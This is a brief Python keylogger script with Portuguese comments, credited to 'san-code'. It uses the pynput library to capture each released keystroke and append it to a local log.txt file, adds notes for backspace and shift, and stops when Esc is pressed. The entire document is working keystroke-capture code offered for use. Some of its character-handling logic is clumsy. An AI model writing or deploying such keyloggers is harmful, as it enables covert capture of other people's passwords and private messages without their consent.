#keyloger com python3
#By san-code

from pynput.keyboard import Listener, Key#para ler teclado

def log(text):
    with open("log.txt", "a+") as file_log:
        file_log.write(text)


def monitor(key):

    if(key == Key.esc):
        log("\nFim do processo!\n")
        return False
    elif(key == Key.enter):
        log("\n")
    elif(key == Key.space):
        log(" ")
    else:
        lista = []
        lista.append(str(key))
        for x in lista:
            for y in range(0, 125):
                if((''.join(x).replace("'", "")) == chr(y)):
                    log(chr(y))
                if(key == Key.backspace):
                    log("(A última letra foi apagada!)")
                    break
                if(key == Key.shift):
                    log(f"{chr(y)}(A última letra foi maiúcula ou minuscula!)")
                    break
                        


with Listener(on_release=monitor) as listener:
    listener.join()
